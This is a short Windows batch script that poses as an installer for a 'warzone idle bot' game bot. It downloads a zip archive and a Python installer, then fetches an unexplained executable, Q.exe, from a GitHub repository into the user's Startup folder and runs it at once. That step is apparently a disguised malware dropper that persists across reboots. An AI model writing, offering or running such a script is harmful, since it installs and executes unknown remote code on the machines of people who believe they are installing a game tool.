cd %homepath%\desktop
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/warzone-idle-bot-master.zip -OutFile WZB.zip"
powershell "Expand-Archive -Force WZB.zip"
del /f WZB.zip
cd %appdata%\TmpFiles
powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe -Outfile PythonInstall.exe"
Pythoninstall.exe
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
exit
